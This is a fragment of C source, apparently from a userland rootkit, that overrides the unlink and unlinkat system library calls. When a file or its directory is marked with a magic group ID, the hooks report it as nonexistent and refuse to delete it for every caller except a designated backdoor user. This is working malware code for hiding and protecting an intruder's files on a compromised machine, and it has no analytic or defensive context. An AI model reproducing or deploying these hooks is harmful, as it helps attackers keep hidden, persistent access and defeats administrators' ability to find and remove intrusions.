int unlink(const char *pathname)
{
    HOOK(o_unlink,CUNLINK);
    if(is_bdusr()) return o_unlink(pathname);
    if(hxstat(pathname,MGID,32)) { errno=ENOENT; return -1; }
    return o_unlink(pathname);
}

int unlinkat(int dirfd, const char *pathname, int flags)
{
    HOOK(o_unlinkat,CUNLINKAT);
    if(is_bdusr()) return o_unlinkat(dirfd,pathname,flags);
    if(hxstat(pathname,MGID,32) || hfxstat(dirfd,MGID,32)) { errno=ENOENT; return -1; }
    return o_unlinkat(dirfd,pathname,flags);
}
